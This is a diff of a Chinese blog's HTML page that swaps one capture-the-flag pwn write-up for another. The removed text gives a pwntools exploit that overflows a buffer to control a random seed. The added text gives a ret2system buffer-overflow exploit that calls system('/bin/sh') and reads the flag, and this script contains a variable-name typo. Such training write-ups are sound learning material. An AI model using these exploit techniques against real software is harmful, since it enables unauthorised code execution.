@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界pwn-dic_game, 小哑师兄">
+    <meta name="keywords" content="攻防世界pwn-level2, 小哑师兄">
     <meta name="description" content="将登太行雪满山">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>攻防世界pwn-dic_game | 小哑师兄</title>
+    <title>攻防世界pwn-level2 | 小哑师兄</title>
     <link rel="icon" type="image/jpeg" href="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-yx272l.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-rrpp6m.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界pwn-dic_game</h1>
+                    <h1 class="description center-align post-title">攻防世界pwn-level2</h1>
                 </div>
             </div>
         </div>
@@ -363,7 +363,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-07-21
+                    2023-07-12
                 </div>
                 
 
@@ -372,7 +372,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    259
+                    99
                 </div>
                 
 
@@ -402,33 +402,19 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718102541.png"  style="zoom:50%;" />
-
-<p>关于elf文件结构<br>.got全局偏移表<br>.plt程序链接表</p>
-<p>#覆盖随机数种子</p>
-<p>又是一个猜数游戏，checksec如下<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718141443.png"  style="zoom:50%;" /></p>
-<p>存在溢出函数read，用time来作为当前的随机数种子<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718141653.png"  style="zoom:50%;" /><br>在sub_556DF3600A20中，v1为输入的数，v2为随机数，如果相等则win，返回1<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142043.png" style="zoom:50%;" /></p>
-<p>当50次都输入正确是，进入sub_556DF3600B28函数，该函数将输出flag<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142153.png"  style="zoom:50%;" /></p>
-<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142228.png"  style="zoom:50%;" />
-
-<p>因此，只要能知道随机数种子就可以预测每一次的数字，从而获得flag。<br>存在的溢出点read函数则可以帮助实现。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142424.png"  style="zoom:50%;" /><br>buf的大小为55，而read分配的空间为0x50，也就是80，buf在栈中到seed的偏移为64。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142544.png"  style="zoom:50%;" /><br> 通过输入name进行溢出覆盖到seed，使得seed可控，从而可预测出随机数</p>
-<p>利用exp如下：</p>
+                <p>存在溢出点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230707221748.png" style="zoom:50%;" /><br>存在system调用，以及字符”&#x2F;bin&#x2F;sh”，可以构造返回地址到 system调用，但是如何将“&#x2F;bin&#x2F;sh”参数写入。<br>根据函数调用约定写入覆盖内容1</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-<span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sys_addr <span class="token operator">=</span> <span class="token number">0x8048320</span>
+binsh <span class="token operator">=</span> <span class="token number">0x804A024</span>
+whaterver_addr <span class="token operator">=</span> <span class="token number">0xcacacaca</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>whatever_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>
-libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>
-
-sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">64</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>
-sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Welcome, let me know your name:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me the point(1~6):"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>[[攻防世界pwn-guess_num]]</p>
+<p>参数调用格式</p>
 
                 
             </div>
@@ -455,7 +441,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://blog.yangsx.cn/2023/07/21/gong-fang-shi-jie-pwn-dic-game/">https://blog.yangsx.cn/2023/07/21/gong-fang-shi-jie-pwn-dic-game/</a>
+                    <a href="https://blog.yangsx.cn/ctf-pwn/6d0f7c20.html">https://blog.yangsx.cn/ctf-pwn/6d0f7c20.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -805,13 +791,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/07/26/gong-fang-shi-jie-pwn-forgot/">
+                <a href="/ctf-pwn/4b131921.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-qzmgjq.jpg" class="responsive-img" alt="攻防世界pwn-forgot">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-jxyowm.png" class="responsive-img" alt="攻防世界pwn-CGFsb">
                         
-                        <span class="card-title">攻防世界pwn-forgot</span>
+                        <span class="card-title">攻防世界pwn-CGFsb</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -822,7 +808,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-26
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
                         </span>
                         <span class="publish-author">
                             
@@ -854,13 +840,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/07/18/gong-fang-shi-jie-pwn-cgpwn2/">
+                <a href="/ctf-pwn/7d1de980.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-7pe3xy.jpg" class="responsive-img" alt="攻防世界pwn-cgpwn2">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-zyxvqy.jpg" class="responsive-img" alt="攻防世界pwn-hello_pwn">
                         
-                        <span class="card-title">攻防世界pwn-cgpwn2</span>
+                        <span class="card-title">攻防世界pwn-hello_pwn</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -871,7 +857,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-10
                             </span>
                         <span class="publish-author">
                             
